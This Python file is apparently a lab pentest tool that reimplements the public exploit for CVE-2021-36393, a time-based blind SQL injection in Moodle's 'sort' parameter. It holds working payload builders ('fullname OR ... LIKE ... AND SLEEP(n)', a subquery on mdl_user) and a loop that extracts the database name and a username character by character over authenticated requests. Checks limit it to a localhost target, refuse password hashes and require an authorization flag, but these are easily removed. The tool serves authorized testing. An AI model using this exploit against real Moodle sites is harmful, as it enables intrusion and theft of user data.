"""Moodle time-based blind SQL injection probe (local lab only).

Standalone tool under ``web-ui/tools/`` — it does NOT touch
``pentestx.py`` or ``pentestx_controlled.py``. It re-implements, with
only the Python standard library, the time-based blind SQLi technique
against a local Moodle instance:

* POST to ``<base-url>/lib/ajax/service.php`` with the
  ``core_course_get_enrolled_courses_by_timeline_classification``
  webservice, injecting into the ``sort`` argument, e.g.
  ``fullname OR (database()) LIKE 'm%' AND SLEEP(3)``;
* a response that takes at least ``--sleep`` seconds means the tested
  character matches, so the value is recovered character by character.

This is the public proof of concept by Julio Ángel Ferrari (T0X1Cx)
for CVE-2021-36393 (MSA-21-0021, CVSS 9.8): time-based SQL injection
in the ``sort`` parameter of
``core_course_get_enrolled_courses_by_timeline_classification``,
affecting Moodle 3.9/3.10/3.11, fixed in 3.9.8, 3.10.5 and 3.11.1.
(The repository that hosts the original script is confusingly titled
CVE-2021-36396; the CVE it exploits is 36393.)

Scope and limits, enforced by this script itself:

* ``--base-url`` must be exactly ``http://127.0.0.1:8080/moodle`` —
  no other host, port or path is accepted;
* ``--extract`` only accepts ``database`` and ``username``. The
  ``password`` column is deliberately NOT extractable: the hash in
  ``mdl_user.password`` was left out on purpose and is only added if
  Robert asks for it explicitly;
* execution requires ``--confirm-written-authorization`` and a
  non-empty ``--authorization-reference``;
* ``--dry-run`` prints the exact request payloads that would be sent
  and sends nothing;
* the session cookie and sesskey are never written to disk or printed
  in full: evidence only stores their SHA-256 and length.

Usage (from the repository root)::

    python3 web-ui/tools/moodle_sqli.py --dry-run
    python3 web-ui/tools/moodle_sqli.py \\
        --sesskey <sesskey-del-navegador> \\
        --session-cookie <valor-de-MoodleSession> \\
        --extract database username \\
        --confirm-written-authorization \\
        --authorization-reference docs/AUTORIZACION-moodle-local.md

Only for your own Moodle in the lab, covered by written
authorization. The sesskey and the MoodleSession cookie expire: take
fresh ones from the browser (logged-in Moodle session) before each
run.
"""

import argparse
import hashlib
import json
import re
import string
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

DEFAULT_BASE_URL = "http://127.0.0.1:8080/moodle"
SERVICE_PATH = "/lib/ajax/service.php"
METHODNAME = "core_course_get_enrolled_courses_by_timeline_classification"
ALLOWED_EXTRACT = ("database", "username")
ALPHABET = (
    string.ascii_lowercase + string.ascii_uppercase + string.digits
    + "!@#$^&*()-_=+[]{}|;:'\",.<>?/"
)
DEFAULT_MAX_CHARS = 50
MAX_MAX_CHARS = 50
DEFAULT_SLEEP = 3
DEFAULT_TIMEOUT = 15
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36"
)

TOOL_DIR = Path(__file__).resolve().parent
REPO_ROOT = TOOL_DIR.parent.parent
EVIDENCE_ROOT = REPO_ROOT / "workspace" / "moodle_sqli"

_TOKEN = re.compile(r"^[A-Za-z0-9._\-/]+$")
_SESSKEY = re.compile(r"^[A-Za-z0-9]{1,128}$")
_COOKIE = re.compile(r"^[A-Za-z0-9_\-]{1,256}$")


class ValidationError(ValueError):
    """A request failed a guardrail check."""


class ConnectionFailed(Exception):
    """The target could not be reached at all."""


def validate_base_url(value):
    """Only the local lab Moodle is allowed, exactly."""
    if not isinstance(value, str):
        raise ValidationError("base-url debe ser texto")
    value = value.strip().rstrip("/")
    if value != DEFAULT_BASE_URL:
        raise ValidationError(
            "base-url no permitido: solo %s" % DEFAULT_BASE_URL)
    return value


def validate_token(value, label):
    """Sesskey / session cookie: no spaces, no control chars, no ';'."""
    if not isinstance(value, str):
        raise ValidationError("%s es obligatorio" % label)
    if value != value.strip() or not value:
        raise ValidationError("%s es obligatorio" % label)
    if any(ord(c) < 33 or ord(c) > 126 for c in value):
        raise ValidationError("%s no válido: caracteres no permitidos" % label)
    if label == "sesskey":
        if not _SESSKEY.fullmatch(value):
            raise ValidationError("sesskey no válido")
    else:
        if not _COOKIE.fullmatch(value):
            raise ValidationError("session-cookie no válido")
    return value


def validate_auth_reference(ref):
    """Same rule as the web-ui backend: a safe, non-empty token."""
    if not isinstance(ref, str):
        raise ValidationError("authorization_reference es obligatoria")
    value = ref.strip()
    if not value:
        raise ValidationError("authorization_reference es obligatoria")
    if len(value) > 200:
        raise ValidationError("authorization_reference demasiado larga")
    if value.startswith("-") or ".." in value.split("/"):
        raise ValidationError("authorization_reference no válida")
    if not _TOKEN.fullmatch(value):
        raise ValidationError(
            "authorization_reference no válida: caracteres no permitidos")
    return value


def validate_extract(values):
    """Only database and username. password is refused on purpose."""
    if not isinstance(values, (list, tuple)) or not values:
        raise ValidationError("extract debe ser una lista no vacía")
    clean = []
    for value in values:
        if not isinstance(value, str):
            raise ValidationError("extract debe ser texto")
        value = value.strip().lower()
        if value == "password":
            raise ValidationError(
                "password no está permitido: la extracción del hash de "
                "mdl_user.password quedó fuera a propósito; solo "
                "database y username")
        if value not in ALLOWED_EXTRACT:
            raise ValidationError(
                "extract no permitido: %s (solo database y username)" % value)
        if value in clean:
            raise ValidationError("extract duplicado: %s" % value)
        clean.append(value)
    return clean


def validate_number(value, label, minimum, maximum):
    try:
        number = int(value)
    except (TypeError, ValueError):
        raise ValidationError("%s debe ser un entero" % label)
    if not minimum <= number <= maximum:
        raise ValidationError(
            "%s debe estar entre %d y %d" % (label, minimum, maximum))
    return number


def sql_literal_escape(text):
    """Escape a value for a single-quoted SQL string literal."""
    return text.replace("'", "''")


def like_escape(text):
    """Escape LIKE wildcards so % and _ are matched literally."""
    return (text.replace("\\", "\\\\")
                .replace("%", "\\%")
                .replace("_", "\\_"))


def build_sort(column, prefix, char, sleep):
    """The injected ``sort`` value for one character probe."""
    probe = sql_literal_escape(like_escape(prefix + char))
    if column == "database":
        expression = "(database()) LIKE '%s%%'" % probe
    elif column == "username":
        expression = (
            "(SELECT username FROM mdl_user LIMIT 1 OFFSET 0) "
            "LIKE '%s%%'" % probe)
    else:
        raise ValidationError("columna no permitida: %s" % column)
    return "fullname OR %s AND SLEEP(%d)" % (expression, sleep)


def build_detection_sort(sleep):
    """A probe that sleeps whenever the sort injection is evaluated."""
    return "fullname OR SLEEP(%d)" % sleep


def build_request_body(sort):
    """The exact JSON body of one webservice call."""
    return {
        "index": 0,
        "methodname": METHODNAME,
        "args": {
            "offset": 0,
            "limit": 0,
            "classification": "all",
            "sort": sort,
            "customfieldname": "",
            "customfieldvalue": "",
        },
    }


def build_service_url(base_url, sesskey):
    return (
        base_url + SERVICE_PATH
        + "?sesskey=" + urllib.parse.quote(sesskey, safe="")
        + "&info=" + METHODNAME)


def build_dry_run_payloads(base_url, extract, sleep):
    """The exact payloads a run would send, without sending anything.

    The sesskey and the session cookie are never printed: the URL
    shows the sesskey redacted and the cookie is not part of the
    payload bodies at all.
    """
    url = (
        base_url + SERVICE_PATH
        + "?sesskey=<sesskey-redacted>&info=" + METHODNAME)
    payloads = [{
        "description": "detection: sleep if the sort injection is evaluated",
        "method": "POST",
        "url": url,
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": USER_AGENT,
            "Origin": base_url.rsplit("/moodle", 1)[0],
            "Referer": base_url + "/my/",
            "Cookie": "MoodleSession=<session-cookie-redacted>",
        },
        "body": [build_request_body(build_detection_sort(sleep))],
    }]
    for column in extract:
        payloads.append({
            "description": (
                "extract %s: first character probe (prefix empty, "
                "character %r)" % (column, ALPHABET[0])),
            "method": "POST",
            "url": url,
            "headers": payloads[0]["headers"],
            "body": [build_request_body(
                build_sort(column, "", ALPHABET[0], sleep))],
        })
    return payloads


def secret_fingerprint(value):
    """Hash + length of a secret, so evidence never stores the value."""
    return {
        "sha256": hashlib.sha256(value.encode("utf-8")).hexdigest(),
        "length": len(value),
    }


class MoodleClient:
    """One authenticated session against the local Moodle."""

    def __init__(self, base_url, sesskey, session_cookie, sleep, timeout):
        self.url = build_service_url(base_url, sesskey)
        self.sleep = sleep
        self.timeout = timeout
        self.origin = base_url.rsplit("/moodle", 1)[0]
        self.referer = base_url + "/my/"
        self.cookie = "MoodleSession=%s" % session_cookie
        self.requests_sent = 0

    def post(self, sort):
        """POST one probe; returns the elapsed seconds."""
        body = json.dumps([build_request_body(sort)]).encode("utf-8")
        request = urllib.request.Request(
            self.url, data=body, method="POST",
            headers={
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/json",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": USER_AGENT,
                "Origin": self.origin,
                "Referer": self.referer,
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Cookie": self.cookie,
                "Connection": "close",
            })
        start = time.monotonic()
        try:
            with urllib.request.urlopen(request, timeout=self.timeout) as resp:
                resp.read()
        except urllib.error.HTTPError as exc:
            # An HTTP error is still a response: its timing counts.
            exc.read()
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            raise ConnectionFailed(str(exc))
        finally:
            self.requests_sent += 1
        return time.monotonic() - start

    def is_slow(self, sort):
        return self.post(sort) >= self.sleep


def extract_value(client, column, max_chars, log):
    """Recover one value character by character; logs progress."""
    result = ""
    for _ in range(max_chars):
        found = None
        for char in ALPHABET:
            if client.is_slow(build_sort(column, result, char, client.sleep)):
                found = char
                break
        if found is None:
            break
        result += found
        log("%s: %s" % (column, result))
    return result


def build_command(request, dry_run):
    """The exact, fixed CLI argument list for a validated request.

    ``--authorization-reference`` only appears when the request
    carries one: the reference is optional when planning/measuring
    the scope, and mandatory to execute (the tool itself requires
    it plus --confirm-written-authorization before running).
    """
    command = [
        sys.executable,
        str(TOOL_DIR / "moodle_sqli.py"),
        "--base-url", request["base_url"],
        "--sesskey", request["sesskey"],
        "--session-cookie", request["session_cookie"],
        "--extract", *request["extract"],
        "--sleep", str(request["sleep"]),
        "--timeout", str(request["timeout"]),
        "--max-chars", str(request["max_chars"]),
        "--confirm-written-authorization",
    ]
    if request.get("authorization_reference"):
        command += ["--authorization-reference",
                    request["authorization_reference"]]
    if dry_run:
        command.append("--dry-run")
    return command


def command_hash(command):
    return hashlib.sha256(json.dumps(command).encode("utf-8")).hexdigest()


def save_evidence(evidence_root, request, result):
    """Write the manifest; secrets only as hash + length, never values."""
    timestamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    directory = Path(evidence_root) / timestamp
    directory.mkdir(parents=True, exist_ok=True)
    manifest = {
        "tool": "moodle_sqli",
        "timestamp_utc": timestamp,
        "base_url": request["base_url"],
        "extract": request["extract"],
        "sleep": request["sleep"],
        "timeout": request["timeout"],
        "max_chars": request["max_chars"],
        "authorization_reference": request["authorization_reference"],
        "sesskey": secret_fingerprint(request["sesskey"]),
        "session_cookie": secret_fingerprint(request["session_cookie"]),
        "result": result,
    }
    (directory / "manifest.json").write_text(
        json.dumps(manifest, indent=2, ensure_ascii=False),
        encoding="utf-8")
    return str(directory)


def parse_args(argv):
    parser = argparse.ArgumentParser(
        description="Moodle time-based blind SQLi probe (local lab only).")
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL,
                        help="solo %s" % DEFAULT_BASE_URL)
    parser.add_argument("--sesskey", default="",
                        help="sesskey vigente de la sesión de Moodle")
    parser.add_argument("--session-cookie", default="",
                        help="valor de la cookie MoodleSession vigente")
    parser.add_argument("--extract", nargs="+", default=["database", "username"],
                        help="solo database y username (password rechazado)")
    parser.add_argument("--max-chars", type=int, default=DEFAULT_MAX_CHARS,
                        help="máximo 50 caracteres por valor")
    parser.add_argument("--sleep", type=int, default=DEFAULT_SLEEP,
                        help="segundos de SLEEP por carácter acertado (1-10)")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
                        help="timeout HTTP por petición (5-60)")
    parser.add_argument("--confirm-written-authorization", action="store_true",
                        help="confirma que existe autorización escrita")
    parser.add_argument("--authorization-reference", default="",
                        help="referencia de la autorización escrita")
    parser.add_argument("--dry-run", action="store_true",
                        help="muestra los payloads exactos sin enviar nada")
    parser.add_argument("--evidence-dir", default=str(EVIDENCE_ROOT),
                        help="directorio raíz de la evidencia local")
    return parser.parse_args(argv)


def log_stderr(message):
    print(message, file=sys.stderr, flush=True)


def main(argv=None):
    args = parse_args(argv)
    try:
        base_url = validate_base_url(args.base_url)
        extract = validate_extract(args.extract)
        sleep = validate_number(args.sleep, "sleep", 1, 10)
        timeout = validate_number(args.timeout, "timeout", 5, 60)
        max_chars = validate_number(args.max_chars, "max-chars", 1, MAX_MAX_CHARS)
    except ValidationError as exc:
        print("error: %s" % exc, file=sys.stderr)
        return 2

    if args.dry_run:
        payloads = build_dry_run_payloads(base_url, extract, sleep)
        print(json.dumps({
            "tool": "moodle_sqli",
            "dry_run": True,
            "base_url": base_url,
            "extract": extract,
            "sleep": sleep,
            "timeout": timeout,
            "max_chars": max_chars,
            "note": "sin tráfico: ningún payload fue enviado; la sesskey "
                    "y la cookie no se muestran",
            "payloads": payloads,
        }, indent=2, ensure_ascii=False))
        return 0

    try:
        sesskey = validate_token(args.sesskey, "sesskey")
        session_cookie = validate_token(args.session_cookie, "session-cookie")
        auth_ref = validate_auth_reference(args.authorization_reference)
    except ValidationError as exc:
        print("error: %s" % exc, file=sys.stderr)
        return 2
    if not args.confirm_written_authorization:
        print("error: falta --confirm-written-authorization",
              file=sys.stderr)
        return 2

    request = {
        "base_url": base_url,
        "sesskey": sesskey,
        "session_cookie": session_cookie,
        "extract": extract,
        "sleep": sleep,
        "timeout": timeout,
        "max_chars": max_chars,
        "authorization_reference": auth_ref,
    }
    client = MoodleClient(base_url, sesskey, session_cookie, sleep, timeout)
    try:
        vulnerable = client.is_slow(build_detection_sort(sleep))
    except ConnectionFailed as exc:
        result = {
            "vulnerable": False,
            "error": "no se pudo conectar a %s: %s" % (base_url, exc),
            "results": {},
            "requests_sent": client.requests_sent,
        }
        evidence_dir = save_evidence(args.evidence_dir, request, result)
        result["evidence_dir"] = evidence_dir
        print(json.dumps(result, indent=2, ensure_ascii=False))
        return 2

    results = {}
    if vulnerable:
        log_stderr("[+] Vulnerable a SQLi ciega por tiempo; extrayendo…")
        for column in extract:
            results[column] = extract_value(
                client, column, max_chars,
                lambda msg: log_stderr(msg))
    else:
        log_stderr("[-] Sin retardo en la sonda de detección: "
                   "no parece vulnerable (o la sesión caducó).")

    result = {
        "tool": "moodle_sqli",
        "vulnerable": vulnerable,
        "base_url": base_url,
        "extract": extract,
        "results": results,
        "requests_sent": client.requests_sent,
    }
    evidence_dir = save_evidence(args.evidence_dir, request, result)
    result["evidence_dir"] = evidence_dir
    print(json.dumps(result, indent=2, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    sys.exit(main())
